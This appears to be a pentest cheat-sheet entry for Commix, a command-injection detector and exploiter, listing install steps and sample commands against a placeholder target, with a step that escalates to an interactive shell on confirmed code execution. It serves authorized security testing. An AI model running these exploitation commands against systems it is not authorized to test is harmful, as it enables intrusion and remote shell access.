# 02.02 Commix

> Automated command injection detector and exploiter — covers Unix and Windows shell breakouts.

## Overview

Commix is sqlmap's cousin for command injection. Identifies and exploits command injection in parameters that get passed to shell execution. Multiple techniques: classic, eval-based, time-based blind, file-based blind, with OOB DNS confirmation. Pair with interactsh for blind detection.

## Steps

- **Step 1** - Install via apt or git clone.
- **Step 2** - Identify a suspected command-injection parameter.
- **Step 3** - Run commix; escalate to interactive shell if RCE confirmed.

## Commands

### Install

```bash
sudo apt install -y commix
```

### Basic detection

```bash
commix -u 'https://<TARGET>/ping?host=1.1.1.1' --batch
```

### POST with form data

```bash
commix -u 'https://<TARGET>/ping' --data 'host=1.1.1.1' --batch
```

### Use Burp request

```bash
commix -r request.txt --batch
```

### Custom OS / technique

```bash
commix -u 'https://<TARGET>/ping?host=1.1.1.1' --batch --os=unix --technique=t
```
